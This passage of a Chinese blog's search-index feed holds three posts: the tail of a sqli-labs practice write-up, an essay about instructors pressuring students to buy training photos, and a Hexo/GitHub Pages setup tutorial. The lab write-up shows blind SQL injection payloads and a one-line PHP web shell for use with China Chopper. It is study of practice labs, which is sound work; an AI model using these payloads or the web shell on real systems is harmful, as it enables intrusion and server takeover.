class="hljs-number">1</span>))&lt;<span class="hljs-number">122</span> %<span class="hljs-number">23</span>，显示存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值小于<span class="hljs-number">122</span>（小写字母z的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">109</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值大于<span class="hljs-number">109</span>（小写字母m的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不小于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br>输入<span class="hljs-number">1</span>&#x27; and <span class="hljs-keyword">ascii</span>(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span> %<span class="hljs-number">23</span>，显示不存在，说明数据库名的第一个字符的<span class="hljs-keyword">ascii</span>值不大于<span class="hljs-number">115</span>（小写字母<span class="hljs-keyword">s</span>的<span class="hljs-keyword">ascii</span>值）；<br><br><span class="hljs-comment">//substr(xxx,y,z)，指的是从xxx中第y个字符开始取出z个字符。</span><br><span class="hljs-comment">//所以数据库名的第一个字符的ascii值为115，即小写字母s。</span><br><span class="hljs-comment">//其它位依次操作，得到结果security</span><br></code></pre></div></td></tr></table></figure><p>老实说到这里光靠手注我已经进行不下去了…上脚本。关于脚本的编写请见我这一篇文章</p></li></ul><hr><h3 id="简单总结"><a href="#简单总结" class="headerlink" title="简单总结"></a>简单总结</h3><hr><ul><li>1~4  GET - Error base 类型，很直白的把信息都显示出来，没啥好说的。</li></ul><ul><li><p>5~6  GET -double  类型，输入的正常查询语句不再显示有用的信息，但报错语句仍有提示。用到了mysql数据库rand,group_by,count函数结合使用的特性（bug？），原理有点复杂，就结果而言和1~4相比其实就是order by后面的步骤中，</p><p><code>union select 1,2...</code> 变成了</p><p><code>union select count(*),concat( (select ..), floor(rand(14)*2))as c from 任一一个表名 group by c </code></p><p>另外，group_concat拼接在语句中会失效（不知道为啥），使用limit语句作为代替来查询 more than 1 row 的数据。</p></li></ul><ul><li><p>7 GET -Dump into out file 类型，初识文件上传漏洞。使用into outfile函数，指定服务器上的绝对路径可实现上传文件，可用来上传一句话木马<code> &lt;?php @eval($_POST[&quot;密码&quot;]);?&gt;</code>，配合中国菜刀（攻击工具）达成目的。 </p><p><em>小插曲：我就在这里写了个一句话木马（虽然在这里并不起作用），win10 的defender还是检测到了并弹出了危险警告。真是苦了defender能在我写的一堆垃圾中还找到疑似会伤害我的东西🤣</em></p></li></ul><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/1DAFD32562C47EE4EB5BDD578D1CA7F0.jpg"></p><ul><li><p>8 GET - Blind - Boolian Based 类型。上来立了用脚本的flag。为啥还没更新..目前还在恶补python呢…</p><p>先占个位置提醒一下自己。</p></li></ul><ul><li>9~10 GET - Blind - Time  Based 类型</li></ul>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不为五斗米取照片</title>
    <link href="/2021/05/16/did-I-need-photo/"/>
    <url>/2021/05/16/did-I-need-photo/</url>
    
    <content type="html"><![CDATA[<hr><p>本来该九月份军训的，因为新冠肺炎推迟到了次年五月。</p><p>今天是军训的第七天。</p><p>上午，教官再次提了集体照的事。</p><span id="more"></span><hr><p>首先有个问题，教官是个什么职业？</p><p>教官们可能都普遍有个军人身份。褪去之后，也是老百姓，要上班的。</p><p>教官，兼职罢了，和家教那种挺像的。当然这只是个人看法。（我贱民可不敢把话说太狂……）</p><p>人总想着赚钱，就开创了副业。</p><p>教官们也有副业，开照相馆的。</p><p>同室友聊天才知道，我们的教官头子，教官们叫他参谋长，是开照相馆的，微信号就是他照相公司营业的号。</p><hr><p>军训的第三四天左右，教官就开始说照集体照的事。</p><p>大意是：</p><p>过两天所有人都要拍集体照，照片15块一张，自愿购买,去外面照相还不止这个价，就只有这两天时间交钱。</p><p>毕竟这可能是我们人生中最后一次军训了，值得回忆巴拉巴拉……</p><p>话说的好听且在理，但我不是很想要照片，纯属个人原因。</p><p>15块不贵也值一顿午饭，应该比一张我几乎不会用到的纸划算。</p><p>当然，目前为止合情合理，额外提供实际服务，绝对自愿。</p><p>而一想到参谋长微信的传闻我就感觉事情没这么简单。</p><p>后面几天，训练的时候教官在操场催交钱，同时微信群收款行云流水。我有理由认为建立微信群相当大的一个理由就是方便收钱。</p><p>说是自愿，100人左右的连队只有大概30%的人交钱时，我们教官满脸不高兴，说是这两天截至，过了时间又一再延期。</p><p>催了数次，问了数次哪些人没交。</p><p>我们教官问一位训练得很好的同学，“你有没有交照片钱？” “交了”。</p><p>于是我们教官指着他对其他没交钱的同学说，“你看看！”，还挺骄傲的。</p><p>这是叫我们向榜样学习呢。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/WQNMD_txbb.png"></p><p>我默不作声，随你便吧。</p><p>而真正让我觉得离谱的，是照相过后发生的事。</p><hr><p>连队一个接一个照相，我们照完后在操场上休息。</p><p>过了一会儿几个别的连队的教官过来叫我们集合，同别的连坐在一起。</p><p>教官们又在催交钱。这破事还要集体做次思想工作。</p><p>要是开学日期能像交钱这回事的截至日期一样一再延迟就好了。</p><p>教官们这次来催钱的方式很奇特。</p><p>他们派了一个演说家，也是一位教官头头，平时拿着话筒发号施令，也常来视察方队的训练情况。</p><p>第一次我们见到他的时按照礼节问候说，教官好，他说不得行，该叫大哥好，因为他是我们团的老大。我觉得这样套近乎挺有趣的。</p><p>我们说“大哥好！”</p><p>他说道，”喔对头！这个团我管事！晚上夜训，想不想我罩着你们？带你们尽情的耍，我说了算！“</p><p>此时我们几个连队都在笑，有大哥好啊。</p><p>”前提是你们要把自己的事做好哈！只要你们做好了，想咋个耍咋个耍！“另外的教官说到”懂得都懂。“</p><hr><p>同学们懂了，他们戏称15块充个剩下7天军训vip。</p><p><strong>我也懂了。要我叫你大哥还要给你钱。斯德哥尔摩综合症是吧。</strong></p><p>没本事还想站着把钱挣了。</p><p>军训照片，我的回忆，他们的人民币。药药切克闹。</p><p>我不为五斗米取照片。</p><p>怎么训练我无所谓的，我不仅铁了心不要照片，顺手还退了微信的群。我管你是不是有什么照片率的指标要完成。</p><p>”大哥“说了一圈过后，要照片的人多了不少。</p><p>接着，我们教官要求发收款码的同学念一下交了钱的人的名字。</p><p>在他念名字的途中，我猜又多了不少”想“要照片的。</p><p>还红脸白脸轮番来，就差一句坦白从宽抗拒从严了。</p><p><strong>我们教官念完名字说到”没交钱的站起来。“</strong></p><p>不站起来他也发现不了。</p><p>可他凭什么让我站起来。不断施压，话越说越重，獠牙渐露。我得站出来。</p><p>我想到的可不是什么人在屋檐下，不得不低头。</p><p>而是宁折不屈。我有点怕万一他们吃相更难看了怎么办，我该怎么做呢。</p><hr><p>同我的一同站起来的还有前面几个同学。教官挨个单独问话，他们有的说什么没加群马上加群啊，刚刚才给啊…….起来几个人又补交了不少。</p><p>我本想说，就是不想要照片，但被教官单独问到”你为什么不交钱“时却只蹦出来一个字，”穷。“</p><p>”那你坐下吧。“</p><p>结束了。</p><p>我原以为会有一场据理力争荡气回肠的battle呢。靠。</p><p>之前那几位没交钱的同学，究竟是怎么想的呢……</p><hr><p>现在回想起来，我该直接就说不想要的。</p><p>有多少同学是迫于压力才要照片的呢，教官们究竟会不会或者已经越界了呢，不得而知了。</p><hr><p>另：</p><p>当天晚训的时候还是按照常规训练。</p><p>我们连队里有以下两个极具代表性的声音：</p><p>1.”我大哥喃？？来带我耍啊？“</p><p>2.“RNM！退钱！！！”</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/RNM_tq.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
    <tags>
      
      <tag>纪实</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搭建自己的博客</title>
    <link href="/2021/05/15/blog_build/"/>
    <url>/2021/05/15/blog_build/</url>
    
    <content type="html"><![CDATA[<hr><p><em>记录一下自己第一次搭建静态博客的经历</em></p><p><strong>本文不会记录详细的操作过程,只是整理流程与记录心得 ^_^</strong></p><hr><span id="more"></span> <h3 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h3><hr><ul><li><p>所用主机</p><ul><li>win10</li></ul></li><li><p>所用软件</p><ul><li><p>git </p><ul><li><p>git是什么？</p><p>​        版本控制工具，方便在不同版本进行切换修改，类似文件分不同时间备份让后需要时找回其中一份代替，同时git所带的<code>git bash</code>方便用户在windows下使用git命令的模拟终端（windows自带的cmd功能太弱）linux、unix可以直接使用git。</p></li></ul></li><li><p>node.js(JavaScript 运行环境,)</p><p>随node.js一同安装的包管理工具npm,使用npm安装的模块hexo</p><ul><li><p>什么是包管理工具？ </p><p>​      也叫包管理器,它允许用户在操作系统上安装、删除、升级、配置和管理软件包。软件包管理器可以是像“软件中心”这样的图形化应用，也可以是像 <a href="https://itsfoss.com/apt-vs-apt-get-difference/">    apt-get</a> 或 <a href="https://itsfoss.com/pacman-command/">pacman</a> 这样的命令行工具,python中的pip即为一种包管理工具。</p></li></ul></li></ul></li></ul><ul><li><p>所借助的平台</p><ul><li><p>github</p><ul><li><p>github是什么？</p><p><del>同性交友网站</del></p><p>利用git进行代码管理的托管平台</p></li><li><p>为什么选择github?</p><p>github有一个很有爱的项目,叫做<code>github pages</code>,这个项目是给开发者建立一个私人页面,所以许多人都拿来搭博客用了,在创建仓库的时候将仓库名名为:用户名.github.io时开启</p><p>即用github pages项目代替了服务器,缺点就是功能不完全,只能控制小部分范围,但这对搭建个人静态博客够用了,用码云gitee同理。</p></li></ul></li></ul><p>​    </p></li></ul><hr><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><hr><p><em>简单来说就是在本地计算机搭建Hexo环境，Hexo通过generate命令将*.md文件渲染成静态的html页面，然后Hexo通过deploy命令触发git用户通过公钥免密登陆服务器(这里的github即作为托管服务器)，进而将静态页面推送到服务器的git仓库（repository）中。然后，服务器再通过钩子（git-hooks） 将静态页面checkout到网站的根目录下，进而实现博客的自动部署。</em></p><hr><h3 id="实际流程"><a href="#实际流程" class="headerlink" title="实际流程"></a>实际流程</h3><hr><ul><li><p>下载git,配置用户信息</p><p>这里需要配置用户名和邮箱。而这些信息并不是起权限验证的作用,这么做的一个目的是为了记录操作过程，就是方便给人看的，如记录某某上传了什么或者干了别的什么。可以随便输入用户名和邮箱但不推荐。</p></li><li><p>将git与github链接在一起</p><ul><li><p>将git与github进行ssh key链接</p><ul><li><p>什么是ssh？</p><blockquote><p><em>SSH 为 Secure Shell （安全外壳协议）的缩写，SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。即可用ssh协议远程登陆主机，这里的远程主机即为github仓库。</em>—摘自《百度百科》</p></blockquote></li><li><p>为什么GitHub需要SSH Key呢？</p><blockquote><p>因为GitHub需要识别出你推送的提交确实是你推送的，而不是别人冒充的，而Git支持SSH协议，所以，GitHub只要知道了你的公钥，就可以确认只有你自己才能推送。当然，GitHub允许你添加多个Key。假定你有若干电脑，你一会儿在公司提           交，一会儿在家里提交，只要把每台电脑的Key都添加到GitHub，就可以在每台电脑上往GitHub推送了。—摘自廖雪峰老师网站</p></blockquote><p>​                                                                                 </p></li></ul></li></ul></li></ul><p>使用git创建ssh密钥，然后将这个密钥添加到github用户的账号中，这样用户即可实现用git免密登录管理gitHubl了</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>值得一提的是生成密钥的命令，常常如下：<br><br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;你的邮箱&quot;</span><br><br><br>-t 用来指定加密算法为 rsa；<br>-C 后面是个注释信息，并不一定要和你 Git 账户的邮箱或者 Git 账户名保持一致，只是常常是和你账户邮箱保持一致，这样设置，就能知道这个公钥被绑定在哪个 Git 账户上了<br></code></pre></div></td></tr></table></figure><ul><li><p>使用hexo搭建博客</p><p>通过在git bash 中使用一些hexo命令。即可实现博客的搭建与上传。</p><p>hexo的工作流程：</p><ul><li><p>hexo  init  文件名 ：</p><p>​        创建一个初始化的文件，里面有搭建hexo博客所需的基本文件，后续操作以及关于博客的修改都在这个文件中进行。</p></li><li><p>hexo g：</p><p>​        生成静态文件。将我们的数据和界面相结合生成静态文件的过程。会遍历主题文件中的 <code>source</code> 文件夹（js、css、img 等静态资源），然后建立索引，然后根据索引生成 <code>pubilc</code> 文件夹，此时的 <code>public</code> 文件是由 html、 js、css、img 建立的纯静态文件可以通过 <code>index.html</code> 作为入口访问你的博客。</p></li><li><p>hexo s:</p><p>生成本地预览文件，通过浏览器搜索localhost:4000即可查看生成的静态博客 </p></li><li><p>hexo d：</p><p>部署文件，即将静态博客上传到服务器上。部署主要是根据在 <code>_config.yml</code> 中配置的git仓库，将博客中<code>public</code>文件上传至 github  中。然后再根据上面的 github 提供的 pages 服务呈现出页面。</p><ul><li><p>如果出现本地预览与部署到服务器上不同的情况，按F12发现css效果缺失，这是由于博客的config配置文件中指名一些css的地址只在localhost下是正确的，而指向服务器的仓库时是错误的，解决办法如下</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>在配置文件url那一部分中加入<br><br> root：/<br></code></pre></div></td></tr></table></figure><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/blog_build_illustration.png"></p><p>意思就是叫浏览器从根目录下慢慢找… 很省事的办法（指省我的事不是省电脑的）</p></li></ul></li></ul><p>​        后续将md类型的文件加入到该文件\source\_posts中即可对博客内容进行修改（不推荐这么做，后文有写原因）。具体样式还需要查看博客主题的的设置，默认的博客主题为landscape。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">整个流程中关于_config.yml配置的配置很关键<br>空格不能少，很坑喔<br><span class="hljs-symbol">deploy:</span> <br><span class="hljs-symbol">    type:</span> git<br><span class="hljs-symbol">    repo:</span> https:<span class="hljs-comment">//github.com/2693993651/2693993651.github.io.git</span><br><span class="hljs-symbol">    branch:</span> main<br>这个配置好之后，即可使用hexo d 命令了<br>另外，因为githu在国内很难访问，hexo的许多命令都可能因不能链接到服务器而失败，需要重试几次。而且，为了有逼格的域名与访问速度还需要去租域名，服务器（或部署gitee）<br></code></pre></div></td></tr></table></figure></li></ul><hr><h3 id="博客的优化"><a href="#博客的优化" class="headerlink" title="博客的优化"></a>博客的优化</h3><hr><ul><li><p>关于文章</p><figure class="highlight haxe"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haxe"><span class="hljs-comment">//建议写文章前先执行以下命令</span><br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> categories<br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> tags<br>hexo <span class="hljs-keyword">new</span> <span class="hljs-type">page</span> about<br></code></pre></div></td></tr></table></figure><p>执行这些命令完善博客的模块结构，以上三条命令执行后博客就会有三个新模块生效了，分别是分类，标签，关于。而执行之前这三个模块是不能启用的,甚至在启用某些主题时页面完全失效。（关于页面还需要到对应的主题配置里面设置才能生效，如遇困难可对照主题的官方文档，因为不是所有主题的about页面设置都一样，所以官方可能会写明使用方法）</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/blog_illustration02.png"></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/illustration01.png"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>建议用下条命令生成新文章<br>hexo n [布局名称] &lt;文档名称&gt;<br></code></pre></div></td></tr></table></figure><p>其中布局名称可以省略，如果省略则默认为post布局。对post进行修改或者创建新的布局，在写文章时会方便很多</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/blog_illustration.png"></p><p>hexo n 执行后会在_post文件夹下生成一个新的md文件，虽然前文说到直接把新的md文件拖到这个文件夹也行，但还是建议用hexo n命令生成文件之后，再对这个文件修改，以下为原因：<img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/imges/illustration02.png"></p><p>​            </p><p>这样生成的文章有自己规范的开头格式，方便对文章进行规范与整理，还能顺手加个more标签</p><p>关于主题</p><p>需要下载主题并配置，关于博客的优化还需要查阅所选主题的官方文档来进行操作，去goole看看别人是怎么使用这个主题的会有很大帮助。</p><p>另外要记得搭建博客的初心啊！！写文章就好不需要太花哨</p><p>（花里胡哨的俺也搞不来）</p></li></ul><hr><h3 id="购买域名"><a href="#购买域名" class="headerlink" title="购买域名"></a>购买域名</h3><hr><p>域名网站上注册账号，买一个域名</p><ul><li><p>在万网控制台添加解析记录</p><p>这里的解析记录有两条分别为CNAME和A记录</p><ul><li><p>CNAME</p><p>www  ——&gt; 用户名.github.io</p></li><li><p>A</p><p>@       ——&gt;一个ipv4地址 (cmd中 ping 你的GitHub账户名.GitHub.io得到)</p></li></ul></li></ul><ul><li><p>在博客文件夹里的source里添加CNAME文件，里面写上购买的域名</p><p>​    <em>完成之后可在github对应仓库里的设置里查看是否有CNAME文件，网址是否已经保存</em></p></li><li><p>最后重新部署文件</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>即输入以下命令<br><br>hexo clean<br><span class="hljs-regexp">//</span>每次部署前都建议输入这个命令清除缓存文件和已生成的静态文件，以防修改不起作用<br>hexo g<br>hexo s<span class="hljs-regexp">//</span>先本地预览，先查看方便及时修改<br>hexo d<br></code></pre></div></td></tr></table></figure></li></ul><p>成功之后即可实现在浏览器中输入域名访问自己的博客了</p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>其他领域</category>
      
    </categories>
    
    
    <tags>
      
      <tag>有手就行</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
